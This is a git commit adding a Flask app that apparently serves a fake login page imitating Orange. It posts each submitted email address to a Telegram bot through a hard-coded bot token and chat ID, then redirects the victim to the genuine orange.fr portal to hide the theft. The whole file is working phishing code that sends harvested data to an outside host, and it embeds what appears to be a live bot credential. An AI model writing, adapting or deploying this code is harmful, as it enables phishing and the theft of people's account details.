61a344b16ac26818c796f7f69887c4274e7055ee
escobar25250616 <etoilebonne033@gmail.com>
2025-05-13 03:22:25 +0200

    Initial commit

---
+++ app.py
@@ -0,0 +1,34 @@
+from flask import Flask, request, redirect, render_template
+import requests
+import os
+
+app = Flask(__name__)
+
+# Remplace par tes vraies infos
+BOT_TOKEN = "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A"
+CHAT_ID = "6297861735"
+
+
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        email = request.form['email']
+
+        message = f"🔐 Nouvelle tentative d'identification\n📧 Adresse: {email}"
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        params = {
+            "chat_id": CHAT_ID,
+            "text": message
+        }
+        try:
+            requests.get(url, params=params)
+        except Exception as e:
+            print("Erreur Telegram:", e)
+
+        return redirect("https://www.orange.fr/portail/")
+
+    return render_template('login.html')
+
+
+if __name__ == '__main__':
+    app.run(debug=True)
